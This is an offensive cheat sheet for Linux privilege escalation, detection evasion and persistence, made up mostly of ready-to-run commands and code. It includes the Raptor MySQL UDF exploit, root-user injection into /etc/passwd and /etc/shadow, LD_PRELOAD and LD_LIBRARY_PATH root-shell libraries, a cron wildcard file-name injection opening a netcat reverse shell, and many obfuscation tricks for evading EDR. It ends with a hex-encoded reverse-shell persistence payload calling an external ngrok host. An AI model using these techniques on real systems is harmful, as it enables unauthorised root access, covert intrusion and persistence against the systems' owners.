## Linux Privesc:
### Privesc via mysql admin
If the mysql service is running as root we can use a popular exploit to execute commands:
We will use [Raptor exploit](https://www.exploit-db.com/exploits/1518) that we will compile on our local machine as follow.
```bash
curl https://www.exploit-db.com/download/1518 -o raptor.c
gcc -g -c raptor.c -fPIC
gcc -g -shared -Wl,-soname,raptor.so -o raptor.so raptor.o -lc
```
Once we have done that we can upload the raptor.so file to the victim machine (see file upload part).
To get an rce we need to run the following commands in mysql:
```bash
mysql -u root <pass> #if we have the password
```
Now in interactive shell:
```mysql
use mysql;
create table testing(line blob);
insert into testing values(load_file('/tmp/raptor.so'));
select * from testing into dumpfile '/usr/lib/mysql/plugin/raptor.so';
create function test_check returns integer soname 'raptor.so';
select test_check('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```
By doing so we have created a copy of bash with the [SUID bit](https://www.computerhope.com/jargon/s/setuid.htm) set.

### Weak file permissions
If we want to explore manually the file system to be a bit stealthier we can run the command
```bash
ls -la <file>
```
to get all the file permissions and attributes.(pretty basic)
If we have those permissions to the files below, we can privesc to root(99% of times):

* /etc/passwd _write_
* /etc/shadow _read_ _write_

#### /etc/passwd write
The /etc/passwd file was once used to store users password hashes, now it just contains users and informations word readable.
But (in some systems)we can still insert an hash and login with that.
To do so we need to create the hash of the password we choose:
```bash
openssl passwd nuovapassword
#example output: $1$sonMJF6I$upCjSzbXyTy4Eush6sx.q/
```
_Generate yescrypt hash:_
```bash
mkpasswd -m yescrypt <password>
#example output: $y$j9T$WWQkTwY3K4ypmjLPoz93h1$V08ZrcWG9OXtqM3wIWEF0ocUmJwxG7WPr19N5/nS9G2
```
Now we can inject the password in a new root user:
```bash
echo 'newroot:$1$sonMJF6I$upCjSzbXyTy4Eush6sx.q/:0:0:root:/root:/bin/bash' >> /etc/passwd
```
Now we can login with our newroot user:
```bash
su newroot  #insert nuovapassword
```
#### /etc/shadow write
We can do pretty much the same thing that we did with /etc/passwd, this time we need to generate a different hash:
```bash
mkpasswd -m sha-512 <password> #i used nuovapassword
mkpasswd -m yescrypt <password>
#example output: $6$ZbDv3Rg7ulgfRGec$Cj90NEnimcwtmzpQLYhV5G7vvp0eiHFsFDrtzLbudr8lYrd16j0U3rTLdHl9zIk7ed8wn.zmya6eDQHGgPFwE1 
```
Once we have the hash we can change the occurency on the file:
```bash
root:<new_hash>:17298:0:99999:7:::
#example: root:$6$ZbDv3Rg7ulgfRGec$Cj90NEnimcwtmzpQLYhV5G7vvp0eiHFsFDrtzLbudr8lYrd16j0U3rTLdHl9zIk7ed8wn.zmya6eDQHGgPFwE1:17298:0:99999:7:::
```
Now we can login as root:
```bash
su root #insert nuovapassword
```
#### /etc/shadow read
The /etc/shadow, as we saw above contains all the user's password hashes.
So we can crack them to recover passwords:
```bash
echo -n '<password_hash>' > hash_to_crack.hash
```
Now we can either crack with john:
```bash
john hash_to_crack.hash -w=/usr/share/wordlists/rockyou.txt
```

or with hashcat (using also gpus):
```bash
hashcat hash_to_crack.hash
```
_For modern systems like kali or ubuntu we can crack the yescrypt hash like this:_
```bash
john hash_to_crack.hash --format=CRYPT -w=/usr/share/wordlists/rockyou.txt
```
_We can identify the hash with [haiti](https://github.com/noraj/haiti):_
```bash
sudo gem install haiti-hash
haiti '<hash>'
```
hashcat auto detects the hashtype and give us the hashtype number
```bash
hashcat -a 0 -m <hash_number_detected> hash_to_crack.hash  /usr/share/wordlists/rockyou.txt
```
For other files the technique may vary, but we can still search recursivly those files (may set allarms):
_With this command we will find all the files owned by OUR CURRENT USER:_
```bash
find / -user `whoami` -type f -exec ls -la {} \; 2>/dev/null | grep -v '/proc/*\|/sys/*'
```
_With this command we will find all the files of THE GROUP that we ARE IN:_
```bash
find / -group `whoami` -type f -exec ls -la {} \; 2>/dev/null | grep -v '/proc/*\|/sys/*'
```
_With this command we will find files that are WORD WRITEABLE:_
```bash
find / -writable ! -user `whoami` ! -group `whoami` -type f -exec ls -al {} \; 2>/dev/null | grep -v '/proc/*\|/sys/*'
```
Eventually we could also check for all the files word readable on the file stytem they are a lot:
```bash
#We can run this command on specific interesting directories:
find /opt/ -readable ! -user `whoami` ! -group `whoami` -type f -exec ls -laR {} \; 2>/dev/null
find /home/ -readable ! -user `whoami` ! -group `whoami` -type f -exec ls -laR {} \; 2>/dev/null
find /var/ -readable ! -user `whoami` ! -group `whoami` -type f -exec ls -laR {} \; 2>/dev/null
find /tmp/ -readable ! -user `whoami` ! -group `whoami` -type f -exec ls -laR {} \; 2>/dev/null
```
### Shell escape sequence
some binaries in linux has a functionality where, by pressing a keyboard combination, we can spawn a shell.<br>
That's dangerous when one of those binaries is allowed to run with sudo.<br>
Those are all the binaries that has a shell escape sequence <br>
https://gtfobins.github.io/#+shell <br>
In general the most frequent way is by typing:
```bash
!/bin/sh
```
It may vary based on the programming language of the linux file.

### Sudo env variables
when we call the sudo programm on linux we have 3 options:
* File to run with sudo privilege
* Path variable to set when calling the sudo command
* Enviroment variable to set, keep or reset

Those variables MUST be resetted, or at least changed from the user ones.<br>
In fact if a user can keep the `LD_PRELOAD` or `LD_LIBRARY_PATH` He can inject his own shared object before or while running the sudo executable. <br>

#### LD_PRELOAD
This variable loads the shared object to be run BEFORE the executable to run with sudo start.<br>
To exploit this we need to create this c script named _preload.c_:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```
now we need to compile it with:
```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```
Once we compiled either on the target or locally we need to have the file preload.so on the machine.<br>
Now we can set the `LD_PRELOAD` variable to our shared object file and get a root shell:
```bash
sudo LD_PRELOAD=/tmp/preload.so <any_programm_to_run_with_sudo>   #use your path to the .so file
```
#### LD_LIBRARY_PATH
This variable set the path of the shared library that the file runned with sudo will pick.<br>
To check which shared library our executable is importing we can do:
```bash
ldd <file_we_can_run_with_sudo>  #here an example with /usr/bin/apache2
```
example output:
```bash
        linux-vdso.so.1 =>  (0x00007fffa5ac3000)
        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f75564ba000)
        libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f7556296000)
        libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f755605c000)
        libpthread.so.0 => /lib/libpthread.so.0 (0x00007f7555e40000)
        libc.so.6 => /lib/libc.so.6 (0x00007f7555ad4000)
        libuuid.so.1 => /lib/libuuid.so.1 (0x00007f75558cf000)
        librt.so.1 => /lib/librt.so.1 (0x00007f75556c7000)
        libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f7555490000)
        libdl.so.2 => /lib/libdl.so.2 (0x00007f755528b000)
        libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f7555063000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f7556977000)
```
let's hikjack for example the `libuuid.so.1` file.<br>
We need to create a c code named _library_path.c_:
```bash
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```
Now we can compile it with:
```bash
gcc -o /tmp/<.so_file_imported_by_sudofile> -shared -fPIC library_path.c
```
Now we just need to run the file by setting the path of the shared libraries:
```bash
sudo LD_LIBRARY_PATH=/tmp <file_to_run_with_sudo>  #apache2 for example
```
### Cron jobs
Cron jobs are automatic tasks that runs every range of time indicated by a [time mask](https://crontab.guru/).<br>
cronjobs are written in the `/etc/crontab` file and they follow this pattern:
```bash
#VARIABLES TO SET:

SHELL=/bin/sh     
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# CRONTAB FORAMT:
.---------------- minute (0 - 59) '*' means every unit of measure 
|  .------------- hour (0 - 23)
|  |  .---------- day of month (1 - 31)
|  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
|  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
|  |  |  |  |
*  *  *  *  *   user    <command_to_be_executed>
*  *  *  *  *   root    /bin/ls -la | /bin/grep 'a'
```
#### Writeable path
If we can controll the path where the crontab is running (as elevated user) we can change the command.<br>
Path must be first in order, otherwise our binary will come after the legit one<br>

#### Wildcard Injection
If a crontab has a command with a wildcard (and we can supply the value of the wildcard) we can get command injection.<br>
Here we can see an example of wildcard:
```bash
* * * * * root /bin/ls -la /tmp/*
```
We can create a file name injection:
```bash
cd /tmp/
touch -- '$(busybox nc <ip> <port> -e bash)'  #enjoy your shell
```

### SUID/SGID binaries
If we want to automatically run binaries with an owner permissions we can assign to the binary the SUID bit.<br>
In this way we don't need to switch user in order to run a command.<br>
although is pretty helpfull, this feature is pretty dangerous because if the binary hasn't any protection it keeps the user token that can be abused.<br>
To assign SUID permission we can do:
```bash
chmod u+s <binary> #assign the user setuid
chmod 4755 <bianry> #assign the bit in octal
```
To assign SGID we can do:
```bash
chmod +g <binary>  #assign group id
chmod 2755 <binary>
```
If we want to set both SUID and GUID:
```bash
chmod +sgx <binary>  #assign SUID GUID and executable bit
chmod 6755 <binary>
```
In order to exploit this we need to know the scenarion.<br>
To find those files in the filesystem we can use this command:
```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
For a general overvoew you can check this page with a list of vulnerable binaries to SUID/GUID:<br>

# Linux evasions
In UNIX like world, Similary to windows, we have detection techniques and security measures.
In order to bypass them we need to out-smart those systems.
## Obfuscation
### Base64 encoding
A way to evade signature-based detections is with command or strings obfuscation:
_We can generate a base64 paylod of the command we'd like to run:_
```bash
echo -n '<command_to_execute>' | base64 -w0
```
To execute it on the target machine:
```bash
echo -n '<base64_payload>' | base64 -d | sh
```
another base64 execution:
```bash
bash<<<$(base64 -d<<<'<base64_command>')
```
### Hex encoding
We can also use hexadecimal rapresentation:
```bash
echo -n '<command_to_execute>' | xxd -p | tr -d '\n'
```
Then to execute it:
```bash
echo -n '<hex_encoded_payload> | xxd -p -r | sh
```
also:
```bash
xxd -r -ps <(echo <hex_command>) | sh
```
Another way to obfuscate hexencoding(\x):
```bash
printf '<command_to_execute>' | od -A n -t x1 | sed 's/ //g' | sed 's/../\\x&/g' | tr -d '\n'
```
then to execute:
```bash
echo -e '<hex_encoded_string>' | sh
```

### BashFuscator
With [this](https://github.com/Bashfuscator/Bashfuscator) powerfull tool we can  create large obfuscated payloads.
To install it:
```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
python3 setup.py install --user
```

!DISCLAIMERS! <br>
!DOESN'T WORK 100% OF TIME SO TEST IT BEFORE RUNNING (-test)! <br>
!YOU NEED A BASH INTERPRETER IN ORDER TO RUN IT! <br>
!FILE SIZE CAN RAMP UP PRETTY QUICKLY! <br>
!RUN MULTIPLE TIMES THE COMMAND TO GET A SMALLER PAYLOAD! <br>

Now we can generate payload like this (with -o we will save it to file):
```bash
bashfuscator -c '<command_to_run>'  --no-file-write --no-random-whitespace --no-insert-chars --no-integer-mangling --no-terminator-randomization --choose-mutators command/case_swapper command/reverse -s 1 -t 3 --layers 2 -o /tmp/obfuscate_command.sh  
```
if this doesn't work:
```bash
bashfuscator -c '<command_to_run>'  -o /tmp/obfuscated_command.sh --test #use --test to check the command
```

We can also obfuscate an entire script file like this:
```bash
bashfuscator -f '<file_to_run>'  -o /tmp/obfuscated_file.sh --test #use --test to check the command
```

### Wildcard completation
We can obfuscate commands using [bash wildcard](https://linuxhint.com/bash_wildcard_tutorial/).<br>
!MAY NOT WORK IF THE MACHINE HAS SOME PARTICULAR BINARIES THAT INTERFEER WITH THE PATH!<br>
This is an example on binary path(?):
```bash
/?i?/e?h? '<command_to_run>' | /?i?/b??h  #we will run /bin/echo ... | /bin/bash
```
This is an example with * wildcard (less stealthy):
```bash
/b*n/e*ho '<command_to_run>' | /b*n/b*sh
```
We can also list files without using ls:
```bash
cd <folder_to_list_files>
/*i*/e?h? *  #execute echo * resulting in ls
```
### String Noise
To evade some EDR or security products we can try to write some chars in weird way: <br>
_square braces chars_
```bash
/[b][i][n]/[e][c][h][o] 'command_to_run' | /[b][i][n]/[s][h]
```
_quoted chars_
```bash
e'c'h''o'' 'command_to_run' | "b"a'''s'"h"'' 
```
_backslashes_
```bash
\e\c\h\o '<command_to_run>' | \b\as\h
/\/////bin///\/\////echo '<command_to_run>' | /\//bin/\/\/sh
```
_at sign_
```bash
e$@c$@h$@o $@'<command_to_run>'$@ | b$@a$@s$@h$@
```
_uppercase transforming_
```bash
$(tr "[A-Z]" "[a-z]"<<<"<camelcase_command_to_run>") #to execute commands like bUsYBox Nc ..
```
_uppercase transformation with printf_
```bash
$(a="<uppercase_command_to_run>";printf %s "${a,,}")
```
_adding errors and fake commands_
```bash
l$(a)s${IFS}-$(a)la #execute ls -la with IFS space bypass and $(a) null command
```
_reversed strings_
```bash
echo '<reversed_command>' | rev
```
also:
```bash
$(rev<<<'<reversed_command_to_run>')
```
### Forbidden chars
Somethimes we can't use chars like spaces or slashes.<br>
_forbidden spaces_
```bash
ls${IFS}-la
```
```bash
{ls,-la}
```
```bash
ls$IFS-la
```
```bash
IFS=à
a=lsà-la
$a
```
```bash
IFS=,;`cat<<<ls,-la`
```
```bash
v=$'ls\x20-la'&&$v
```
```bash
echo${IFS}-e${IFS}"ls\x09-l"|sh
```
_create a file with newlines escaped_
```bash
echo${IFS}"command_to_execute"${IFS}|${IFS}sed${IFS}'s/./&\\\n/g'${IFS}>${IFS}file.txt
bash${IFS}file.txt 
```

### Alternative shell execution
We can bypass some security products by avoiding notorious shell names such as `sh, bash, rbash, dash, pwsh, tmux, screen ,zsh, ash, tcsh'.<br>
To do so we can use tricks to call a shell:<br>
_Via shell variable_
```bash
echo <command_to_execute> |$0
```
_Via backticks_
```bash
`echo <command_to_execute>`
```
_Via command substitution_
```bash
$(echo <command_to_execute>)
```
_Via backticks and created files:_
```bash
mkdir /tmp/test  #we will create an empty folder
cd /tmp/test
touch -- 'command to execute'  #then we can create a file that as payload as name  
`ls`  #eventually with command substitution we can execute the file via getting its name
```
_Via backticks and Create file 2_
```bash
cd /tmp/test
echo '' > 'command_to_execute'
`ls`
```
# Persistence
Once we gained command execution on the machine we need to access it whenver we want, also even after a restart.<br>
For this reason we need to install persistence on the machine, possibly in a obfuscated way.
## Obfuscated persistence
we can create a clever payload, mixing some of the obfuscation techniques we saw above:
_Shell via file name_
```bash
mkdir /tmp/a2b3c4;cd /tmp/a2b3c4;touch -- 'echo -e \x62\x75\x73\x79\x62\x6f\x78\x20\x6e\x63\x20\x37\x2e\x74\x63\x70\x2e\x65\x75\x2e\x6e\x67\x72\x6f\x6b\x2e\x69\x6f\x20\x31\x30\x32\x38\x33\x20\x2d\x65\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20\x26';cd ../; `ls a2b3c4`|$0;rm -rf a2b3c4
```
